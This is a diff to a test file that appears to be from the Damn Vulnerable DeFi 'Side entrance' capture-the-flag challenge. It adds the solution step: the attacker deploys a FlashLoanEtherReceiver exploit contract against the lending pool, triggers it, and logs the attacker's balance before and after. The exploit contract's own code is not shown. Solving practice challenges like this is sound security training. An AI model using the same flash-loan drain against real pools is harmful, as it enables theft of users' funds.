@@ -25,6 +25,21 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // attacker connects.
+        this.pool = this.pool.connect(attacker);
+
+        // Initial balance of attacker:
+        console.log("Initial balance of attacker "  + parseInt(this.attackerInitialEthBalance["_hex"], 16));
+
+        // the contract factory of the exploit contract.
+        const ExploitFactory = await ethers.getContractFactory('FlashLoanEtherReceiver', attacker);
+        this.exploit = await ExploitFactory.deploy(this.pool.address);
+
+        await this.exploit.exploit();
+
+        // Final balance of attacker;
+        const updatedBalance = await ethers.provider.getBalance(attacker.address);
+        console.log("Updated balance of attacker " + parseInt(updatedBalance["_hex"], 16));
     });
 
     after(async function () {
